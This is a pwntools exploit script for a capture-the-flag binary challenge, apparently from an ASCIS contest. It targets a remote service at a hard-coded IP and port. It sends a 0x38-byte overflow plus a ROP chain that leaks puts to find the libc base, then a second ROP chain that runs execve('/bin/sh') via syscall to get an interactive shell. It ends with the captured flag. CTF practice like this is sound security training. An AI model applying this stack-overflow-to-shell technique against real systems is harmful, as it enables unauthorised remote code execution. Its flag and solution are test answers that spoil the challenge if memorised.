#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.143.130.87'
port = 4097
elf_name = './chall'
elf = ELF(elf_name)
libc = ELF('./libc-2.31.so')
# b *0x00000000004014BC
script = '''
b *0x0000000000401310
c
'''
# script += 'c\n'
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

rdi = 0x0000000000401523
ropchain = [rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']]
ropchain = b''.join(map(p64, ropchain))

payload = b'a'*0x38 + ropchain
p.sendlineafter(b'What is your name?\n', payload)
p.sendlineafter(b'Can you guess my secret?\n', str(0x61616161).encode())

p.recvuntil(b'cat /home/ctf/flag.txt\n')
libc_base = u64(p.recv(6) + b'\x00\x00') - libc.sym['puts']
log.info('libc base ' + hex(libc_base))
libc.address = libc_base

check = 0x40404C
binsh = 0x00000000001b45bd + libc_base
syscall = 0x000000000002284d + libc_base
rop = ROP(libc)
rop(rdi=binsh, rsi=0, rdx=0, rax=59)
# rop(rdi=0x402020)
one_gadget = 0xe3afe + libc_base
r15 = 0x0000000000023b69 + libc_base
r12 = 0x000000000002f709 + libc_base
# ropchain = [r15, 0, r12, 0, one_gadget]
# ropchain = [rdi, check, elf.plt['puts'], elf.sym['main']]
ropchain = b''.join(map(p64, ropchain))

payload = b'a'*0x38 
# payload += rop.chain() + p64(one_gadget)
payload += rop.chain() + p64(syscall)

p.sendlineafter(b'What is your name?\n', payload)
p.sendlineafter(b'Can you guess my secret?\n', str(0x61616161).encode())

# payload = b'a'*0x38 
# payload += p64(0x4012D4)
# p.sendlineafter(b'What is your name?\n', payload)
# p.sendlineafter(b'Can you guess my secret?\n', str(0x61616161).encode())

p.interactive()

# ASCIS{syscall_g00d_int_0x80_b3st}